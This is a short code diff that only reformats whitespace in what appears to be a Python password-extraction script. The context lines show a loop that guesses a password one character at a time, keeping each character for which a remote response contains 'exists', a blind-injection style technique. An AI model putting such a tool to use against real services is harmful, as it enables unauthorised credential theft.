@@ -31,7 +31,7 @@ while True:
             pattern = re.compile(r'exists')
             result = pattern.findall(res.text)
             sys.stdout.write(
-                Fore.LIGHTGREEN_EX + "[+] " + inputs[i] + "  ==> " + Fore.GREEN + password+"\r" + Fore.WHITE)
+                Fore.LIGHTGREEN_EX + "[+] " + inputs[i] + "  ==> " + Fore.GREEN + password + "\r" + Fore.WHITE)
             if(len(result) > 0):
                 password = password + inputs[i]
                 break
@@ -39,4 +39,4 @@ while True:
         except KeyboardInterrupt:
             exit(
                 Fore.RED + "\n[-] Detected Keyboard interrupt. Terminating...." + Fore.WHITE)
-    x = x+1
+    x = x + 1
